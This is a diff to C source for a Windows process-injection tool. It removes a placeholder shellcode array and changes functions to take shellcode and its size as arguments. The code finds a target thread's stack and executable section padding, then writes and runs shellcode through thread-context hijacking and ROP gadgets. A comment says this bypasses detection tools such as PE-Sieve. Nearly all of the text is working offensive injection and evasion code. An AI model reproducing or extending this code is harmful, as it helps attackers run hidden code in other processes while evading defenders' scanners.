@@ -9,49 +9,6 @@
 #define JMP_LOOP_OFFSET 0x1CF2B
 #define SHELLCODE_PADDING 0x30
 
-//
-// Example shellcode:
-// Make sure to have 8 reserved bytes for 64-bit
-// jmp loop gadget to ROP into to stall execution.
-// You will also need 40 reserved bytes for the 
-// shadow stack used by ReadProcessMemory and 
-// WriteProcessMemory.
-//
-BYTE Shellcode[] = {
-    //
-    // 8 bytes for RET gadget.
-    //
-    0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
-    //
-    // Shadow stack.
-    //
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    //
-    // Actual shellcode starts here.
-    //
-    0xEB, 0xFE, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAA,
-    0xBB, 0xCC, 0xDD, 0xEE, 0xFF, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
-    0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
-};
-
 static
 BOOL
 SetExecutionContext(
@@ -120,6 +77,7 @@ GetStackOffset(
     _In_ HANDLE ProcessHandle,
     _In_ PVOID Address,
     _In_ SIZE_T AddressSize,
+    _In_ SIZE_T ShellcodeSize,
     _Out_ ULONG_PTR *StackOffset
 )
 {
@@ -153,7 +111,7 @@ GetStackOffset(
     // Enumerate from bottom (it's a stack).
     // Start from -5 * 8 => at least five arguments + shellcode.
     //
-    for (SIZE_T i = AddressSize - 5 * sizeof(SIZE_T) - sizeof(Shellcode); i > 0; i -= sizeof(SIZE_T)) {
+    for (SIZE_T i = AddressSize - 5 * sizeof(SIZE_T) - ShellcodeSize; i > 0; i -= sizeof(SIZE_T)) {
         ULONG_PTR* StackVal = (ULONG_PTR*)((LPBYTE)Stack + i);
         if (*StackVal == 0) {
             //
@@ -174,6 +132,7 @@ BOOL
 GetStackLocation(
     _In_ HANDLE ProcessHandle,
     _In_ HANDLE ThreadHandle,
+    _In_ SIZE_T ShellcodeSize,
     _Out_ PVOID* StackLocation
 )
 {
@@ -212,6 +171,7 @@ GetStackLocation(
         ProcessHandle,
         Tib.StackLimit,
         (ULONG_PTR)Tib.StackBase - (ULONG_PTR)Tib.StackLimit,
+        ShellcodeSize,
         &StackOffset
     );
     if (!Success) {
@@ -228,6 +188,7 @@ BOOL
 GetStackAndShellcodeLocations(
     _In_ HANDLE ProcessHandle,
     _In_ HANDLE ThreadHandle,
+    _In_ SIZE_T ShellcodeSize,
     _Out_ PVOID* StackLocation,
     _Out_ PVOID* ShellcodeLocation
 )
@@ -330,7 +291,7 @@ GetStackAndShellcodeLocations(
         // the padding of sections suits the fifth, optional
         // argument for ReadProcessMemory and WriteProcessMemory.
         //
-        if (MemoryBasicInfo.Protect & PAGE_READWRITE) {
+        if (!*StackLocation && MemoryBasicInfo.Protect & PAGE_READWRITE) {
             //
             // Stack location in RW page starting at the bottom.
             //
@@ -338,6 +299,7 @@ GetStackAndShellcodeLocations(
                 ProcessHandle,
                 MemoryBasicInfo.BaseAddress,
                 MemoryBasicInfo.RegionSize,
+                ShellcodeSize,
                 &StackOffset
             );
             if (!Success) {
@@ -345,12 +307,12 @@ GetStackAndShellcodeLocations(
             }
 
             *StackLocation = (PVOID)((LPBYTE)MemoryBasicInfo.BaseAddress + StackOffset);
-        } else if (MemoryBasicInfo.Protect == PAGE_EXECUTE_READ && MemoryBasicInfo.RegionSize >= (sizeof(Shellcode) - SHELLCODE_PADDING)) {
+        } else if (!*ShellcodeLocation && MemoryBasicInfo.Protect == PAGE_EXECUTE_READ && MemoryBasicInfo.RegionSize >= (ShellcodeSize - SHELLCODE_PADDING)) {
             //
             // Look from the bottom for potential padding.
             // Infecting padding will bypass tools like PE-Sieve.
             //
-            *ShellcodeLocation = (PVOID)((LPBYTE)MemoryBasicInfo.BaseAddress + MemoryBasicInfo.RegionSize - sizeof(Shellcode) + SHELLCODE_PADDING);
+            *ShellcodeLocation = (PVOID)((LPBYTE)MemoryBasicInfo.BaseAddress + MemoryBasicInfo.RegionSize - ShellcodeSize + SHELLCODE_PADDING);
         }
 
         i += MemoryBasicInfo.RegionSize;
@@ -360,7 +322,7 @@ GetStackAndShellcodeLocations(
         //
         // Fallback to find the actual stack location.
         //
-        GetStackLocation(ProcessHandle, ThreadHandle, StackLocation);
+        GetStackLocation(ProcessHandle, ThreadHandle, ShellcodeSize, StackLocation);
     }
 
     return TRUE;
@@ -433,7 +395,7 @@ InjectData(
         // RDX: Buffer to store data.
         (DWORD64)DataWriteAddress,
         // R8: Address to read data.
-        (DWORD64)((LPBYTE)*StackLocation + 0x30),
+        (DWORD64)((LPBYTE)*StackLocation + SHELLCODE_PADDING),
         // R9: Size to write
         WriteSize,
         NULL
@@ -449,6 +411,8 @@ BOOL
 InjectPayload(
     _In_ HANDLE ProcessHandle,
     _In_ HANDLE ThreadHandle,
+    _In_ LPBYTE Shellcode,
+    _In_ SIZE_T ShellcodeSize,
     _In_ BOOL RestoreExecution
 )
 {
@@ -494,6 +458,7 @@ InjectPayload(
     Success = GetStackAndShellcodeLocations(
         ProcessHandle,
         ThreadHandle,
+        ShellcodeSize,
         &StackLocation,
         &ShellcodeLocation
     );
@@ -508,14 +473,14 @@ InjectPayload(
         OriginalShellcode = HeapAlloc(
             GetProcessHeap(),
             HEAP_ZERO_MEMORY,
-            sizeof(Shellcode) - SHELLCODE_PADDING
+            ShellcodeSize - SHELLCODE_PADDING
         );
         if (OriginalShellcode) {
             ReadProcessMemory(
                 ProcessHandle,
                 ShellcodeLocation,
                 OriginalShellcode,
-                sizeof(Shellcode) - SHELLCODE_PADDING,
+                ShellcodeSize - SHELLCODE_PADDING,
                 NULL
             );
         }
@@ -545,8 +510,8 @@ InjectPayload(
         StackLocation,
         ShellcodeLocation,
         Shellcode,
-        sizeof(Shellcode),
-        sizeof(Shellcode) - SHELLCODE_PADDING
+        ShellcodeSize,
+        ShellcodeSize - SHELLCODE_PADDING
     );
 
     //
@@ -584,11 +549,11 @@ InjectPayload(
                 &ThreadHandle,
                 DupeProcessHandle,
                 &StackLocation,
-                (LPBYTE)StackLocation + 0x30,
+                (LPBYTE)StackLocation + SHELLCODE_PADDING,
                 ShellcodeLocation,
                 OriginalShellcode,
-                sizeof(Shellcode) - SHELLCODE_PADDING,
-                sizeof(Shellcode) - SHELLCODE_PADDING
+                ShellcodeSize - SHELLCODE_PADDING,
+                ShellcodeSize - SHELLCODE_PADDING
             );
 
             HeapFree(GetProcessHeap(), 0, OriginalShellcode);
